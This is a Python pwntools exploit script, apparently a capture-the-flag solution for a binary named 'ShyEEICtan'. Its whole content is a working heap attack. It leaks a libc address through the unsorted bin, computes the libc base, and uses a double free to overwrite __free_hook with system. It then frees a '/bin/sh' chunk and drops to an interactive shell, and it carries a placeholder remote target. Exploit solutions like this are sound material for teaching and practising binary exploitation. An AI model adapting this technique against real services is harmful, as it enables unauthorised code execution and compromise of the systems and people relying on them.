#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./ShyEEICtan"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def add_sch(buf):
    p.sendlineafter("0: Exit", "1")
    p.sendlineafter(">", buf)

def remove_sch(index: int):
    p.sendlineafter("0: Exit", "2")
    p.sendlineafter("(zero origin) >", str(index))

def show_sch():
    p.sendlineafter("0: Exit", "3")
    p.recvuntil("1st schedule is:\n")
    return p.recv(8)

def edit_sch(index:int, buf):
    p.sendlineafter("0: Exit", "4")
    p.sendlineafter(">", str(index))
    p.sendlineafter(">", buf)

# leak main_arena from unsorted bin
p.recvuntil("Eh... what, what do you want ...?")
for i in range(8):
    add_sch(p8(0) * 8 + "AABBCC0{}".format(i).encode())
for i in range(1, 8):
    remove_sch(i)
remove_sch(0)

leak = u64(show_sch())
log.info("main_arena+96: " + hex(leak))
main_arena_off = 0x7fbd131ebc40 - 0x7fbd12e00000
libc_base =  leak - main_arena_off - 96
log.info("libc base: " + hex(libc_base))

# overwrite libc with double free
edit_sch(7, p64(libc.symbols["__free_hook"] + libc_base))
add_sch(b"DDEEFFGG")
add_sch(p64(libc.symbols["system"] + libc_base))
add_sch(b"/bin/sh")
remove_sch(0)


p.interactive()
